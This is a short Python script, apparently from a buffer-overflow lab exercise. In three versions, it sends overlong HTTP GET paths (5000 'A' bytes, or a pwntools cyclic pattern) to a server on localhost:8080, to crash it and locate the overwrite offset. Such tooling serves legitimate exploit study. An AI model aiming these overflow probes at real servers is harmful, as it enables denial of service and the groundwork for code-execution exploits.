'''import socket

# Create a long request with 5000 "A" characters
payload = b"GET /" + b"A" * 5000 + b" HTTP/1.0\r\n\r\n"

# Connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8080))
s.send(payload)

# Receive response
response = s.recv(1024)
print("Server Response:")
print(response.decode())

# Close connection
s.close()'''
'''
from pwn import cyclic
import socket

# Generate a cyclic pattern (5000 bytes long)
payload = b"GET /" + cyclic(5000) + b" HTTP/1.0\r\n\r\n"

# Connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8080))
s.send(payload)

# Receive response
response = s.recv(1024)
print("Server Response:")
print(response.decode())

# Close connection
s.close()
'''

from pwn import cyclic
import socket

# Generate a cyclic pattern (1000 bytes long)
payload = b"GET /" + cyclic(1000) + b" HTTP/1.0\r\n\r\n"

# Connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 8080))
s.send(payload)

# Receive response
response = s.recv(1024)
print("Server Response:")
print(response.decode())

# Close connection
s.close()
